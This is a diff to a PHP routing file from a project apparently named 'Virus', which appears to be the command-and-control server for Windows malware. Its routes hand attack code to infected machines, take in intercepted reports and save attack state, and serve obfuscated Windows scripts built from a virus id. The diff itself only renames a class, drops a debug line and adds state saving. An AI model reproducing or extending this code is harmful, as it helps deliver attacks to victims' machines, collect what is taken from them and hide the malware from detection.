@@ -1,7 +1,7 @@
 <?php
 
 use Kelvinho\Virus\Attack\AttackBase;
-use Kelvinho\Virus\Attack\BaseScriptWin;
+use Kelvinho\Virus\Attack\BaseScript\Windows;
 use Kelvinho\Virus\Singleton\Header;
 use Kelvinho\Virus\Singleton\Logs;
 
@@ -26,10 +26,11 @@ $router->getMulti(["vrs/*/aks/*/code", "viruses/*/attacks/*/code"], function () 
     Header::ok();
 });
 $router->postMulti(["vrs/*/aks/*/report", "viruses/*/attacks/*/report"], function () use ($requestData, $virusFactory, $attackFactory) {
-    echo "something";
     $attack_id = $requestData->getExplodedPath()[3];
     if (!$attackFactory->exists($attack_id)) Logs::strayAttack($attack_id);
-    $attackFactory->get($attack_id)->includeIntercept();
+    $attack = $attackFactory->get($attack_id);
+    $attack->includeIntercept();
+    $attack->saveState();
     Header::ok();
 });
 $router->getMulti(["vrs/*/aks/*/extras/*", "viruses/*/attacks/*/extras/*"], function () use ($requestData, $attackFactory) {
@@ -41,8 +42,8 @@ $router->getMulti(["vrs/*/aks/*/extras/*", "viruses/*/attacks/*/extras/*"], func
 });
 
 $router->get("obfuscate", function () {
-    echo BaseScriptWin::obfuscate(BaseScriptWin::complexMain("209b093ec7c0610777b784fb29db4eb39b526a0a5c17c84040061a01ddb5b9e3"));
+    echo Windows::obfuscate(Windows::complexMain("209b093ec7c0610777b784fb29db4eb39b526a0a5c17c84040061a01ddb5b9e3"));
 });
 $router->get("complex", function () {
-    echo BaseScriptWin::complexMain("209b093ec7c0610777b784fb29db4eb39b526a0a5c17c84040061a01ddb5b9e3");
+    echo Windows::complexMain("209b093ec7c0610777b784fb29db4eb39b526a0a5c17c84040061a01ddb5b9e3");
 });
